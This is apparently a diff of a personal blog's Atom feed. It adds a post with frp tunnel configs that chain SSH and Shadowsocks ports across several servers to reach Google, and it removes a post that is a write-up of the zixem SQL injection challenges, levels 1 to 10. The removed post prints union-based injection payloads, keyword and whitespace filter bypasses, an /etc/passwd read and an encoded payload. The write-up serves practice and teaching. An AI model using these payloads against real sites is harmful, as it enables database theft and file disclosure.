@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-03-25T14:35:06.489Z</updated>
+  <updated>2023-04-01T10:53:09.625Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>shadowsocket配置</title>
+    <link href="http://example.com/fc41ab04.html"/>
+    <id>http://example.com/fc41ab04.html</id>
+    <published>2023-04-01T07:08:18.000Z</published>
+    <updated>2023-04-01T10:53:09.625Z</updated>
+    
+    <content type="html"><![CDATA[<p class='p center large'>记录一下shadowsocket的配置</p><p class='p center small'>为了愉快的使用Google</p><h3 id="国内-209-配置"><a href="#国内-209-配置" class="headerlink" title="国内[209]配置"></a>国内[209]配置</h3><details cyan><summary> 国内[209]配置 </summary>              <div class='content'>              <div class="note "><p><strong>server配置</strong></p><p>[common]<br>bind_port &#x3D; 7001</p></div><div class="note "><p><strong>client配置</strong></p><p>[common]<br>server_addr &#x3D; 127.0.0.1<br>server_port &#x3D; 7000</p><p>[ssh]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 22<br>remote_port &#x3D; 6000</p></div>              </div>            </details><hr><h3 id="硅谷-184-配置"><a href="#硅谷-184-配置" class="headerlink" title="硅谷[184]配置"></a>硅谷[184]配置</h3><details cyan><summary> 硅谷[184]配置 </summary>              <div class='content'>              <div class="note "><p><strong>新加坡[188]server配置</strong></p><p>[common]<br>bind_port &#x3D; 7001</p></div><div class="note "><p><strong>新加披[188]client配置</strong></p><p>[common]<br>server_addr &#x3D; 国内[209]<br>server_port &#x3D; 7001</p><p>[frp_shadow]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 8890<br>remote_port &#x3D; 8889</p><p>[frp_shh]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 6002<br>remote_port &#x3D; 6667</p></div>              </div>            </details><hr><h3 id="新加坡-188-配置"><a href="#新加坡-188-配置" class="headerlink" title="新加坡[188]配置"></a>新加坡[188]配置</h3><details cyan><summary> 新加坡[188]配置 </summary>              <div class='content'>              <div class="note "><p><strong>server配置</strong></p><p>bind_port &#x3D; 7000</p></div><div class="note "><p><strong>新加坡[188]client配置</strong></p><p>[common]<br>server_addr &#x3D; [硅谷]184<br>server_port &#x3D; 7001</p><p>[frp_client_188]<br>type &#x3D; tcp<br>local_ip &#x3D; 1270.0.1<br>local_port &#x3D; 22<br>remote_port &#x3D; 6002</p><p>[shadowrocket_client_188]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 8388<br>remote_port &#x3D; 8890</p></div>              </div>            </details>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p class=&#39;p center large&#39;&gt;记录一下shadowsocket的配置&lt;/p&gt;
+&lt;p class=&#39;p center small&#39;&gt;为了愉快的使用Google&lt;/p&gt;
+
+&lt;h3 id=&quot;国内-209-配置&quot;&gt;&lt;a href=&quot;#国内-209-配置&quot; class</summary>
+      
+    
+    
+    
+    <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>操作系统 - 调度算法的评价指标</title>
@@ -481,26 +508,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;记录打靶机（Hackathon2）的过程&quot;&gt;&lt;a href=&quot;#记录打靶机（Hackathon2）的过程&quot; class=&quot;headerlink&quot; title=&quot;记录打靶机（Hackathon2）的过程&quot;&gt;&lt;/a&gt;记录打靶机（Hackathon2）的过程&lt;/h2&gt;&lt;</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>zixem SQL challenges</title>
-    <link href="http://example.com/19459.html"/>
-    <id>http://example.com/19459.html</id>
-    <published>2021-07-22T08:43:09.000Z</published>
-    <updated>2023-03-25T14:35:06.472Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="/images/pasted-5.png" class="lazyload" data-srcset="/images/pasted-5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>简单的一关，常规的联合查询注入(数字型)。</p><pre><code>?id=1 and 1=2 union select 1,concat(user(),version),3--+</code></pre><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="/images/pasted-6.png" class="lazyload" data-srcset="/images/pasted-6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>同Level 1简单，字符型注入，闭合单引号即可。</p><pre><code>?showprofile=4&#39; and 1=2 union select 1,user(),version(),4--+</code></pre><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="/images/pasted-7.png" class="lazyload" data-srcset="/images/pasted-7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>常规字符型注入，使用<code>--+</code>闭合单引号号即可，<br>在使用<code>union</code>进行注入时，<code>union</code>会变成<code>uni</code>，此时需要使用<code>unionon</code>。</p><pre><code>?item=3&#39; and 1=2 unionon select 1,user(),version(),4--+</code></pre><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="/images/pasted-8.png" class="lazyload" data-srcset="/images/pasted-8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>同Level 3，字符型注入，闭合单引号，注入语句无法使用<code>-</code>使其报错，可使用<code>and 1=2</code>。</p><pre><code>?ebookid=7&#39; and 1=2 union select 1,2,user(),version(),5--+</code></pre><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>需要爆破，待…</p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="/images/pasted-17.png" class="lazyload" data-srcset="/images/pasted-17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><pre><code> and 1=2 union select (select id from teachers limit 1,1),(select teacher from teachers limit 1,1),(select teacher_age from teachers limit 1,1),(select price from teachers limit 1,1)--</code></pre><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="/images/pasted-9.png" class="lazyload" data-srcset="/images/pasted-9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关有点意思，注入好久没发现问题在哪，网上搜索后发现数据提交之后页面源代码中有个隐藏的<code>value</code>。</p><p><img src="/images/pasted-10.png" class="lazyload" data-srcset="/images/pasted-10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>图中<code>value</code>的值就是注入点，后面都是常规注入操作</p><pre><code>?id=1 AND 1=2 UNION SELECT 1,user(),3--+</code></pre><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="/images/pasted-11.png" class="lazyload" data-srcset="/images/pasted-11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关会对<code>%20</code>进行过滤（初步判断）以及会对<code>select</code>进行检测，双写可绕过，数字型注入，可使用<code>%09、%0d</code>进行绕过，后面就是常规的注入操作。</p><pre><code>?id=1%09and%091=2%09union%09seselectlect%09user(),version(),3--%09-</code></pre><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p><img src="/images/pasted-12.png" class="lazyload" data-srcset="/images/pasted-12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关需要读取<code>/etc/passwd</code>文件，经测试知道<code>load_file()</code>被禁止。不过在插入SQL注入语句(字符型注入)时会报以下错误：</p><p><img src="/images/pasted-13.png" class="lazyload" data-srcset="/images/pasted-13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>根据报错提示可以在<code>1</code>处进行读取</p><pre><code>?id=1&#39; and 1=2 union select &#39;../etc/passwd&#39;,2-- -</code></pre><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p><img src="/images/pasted-14.png" class="lazyload" data-srcset="/images/pasted-14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关<code>x</code>为注入点，但是参数是经过编码的，刚开始以为是<code>base64 encode + url encode</code>,解码后发现并没有那么简单，经过看别人的blog后了解到是<code>uuencode</code>，解码后参数显示为<code>1</code>。将SQL注入语句经过编码后可正常执行。</p><p><img src="/images/pasted-15.png" class="lazyload" data-srcset="/images/pasted-15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>将SQL注入语句编码后即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,concat(user(),version())-- -</span><br><span class="line"></span><br><span class="line">经过uuencode加密后得到</span><br><span class="line">M,2!A;F0@,3TR(&#x27;5N:6]N(&#x27;-E;&amp;5C=&quot;`Q+&amp;-O;F-A=&quot;AU&lt;V5R*&quot;DL=F5R&lt;VEO</span><br><span class="line">(;B@I*2TM(&quot;T`</span><br><span class="line">`</span><br><span class="line"></span><br><span class="line">再使用base64进行编码得到</span><br><span class="line">TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA=</span><br><span class="line"></span><br><span class="line">最后使用url编码得到最终payload</span><br><span class="line">TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA%3D</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-16.png" class="lazyload" data-srcset="/images/pasted-16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br><strong>done</strong></p><p><strong>参考链接 <a href="https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4">https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4</a></strong></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;Level-1&quot;&gt;&lt;a href=&quot;#Level-1&quot; class=&quot;headerlink&quot; title=&quot;Level 1&quot;&gt;&lt;/a&gt;Level 1&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-5.png&quot; class=&quot;lazyload&quot; d</summary>
       
     
     
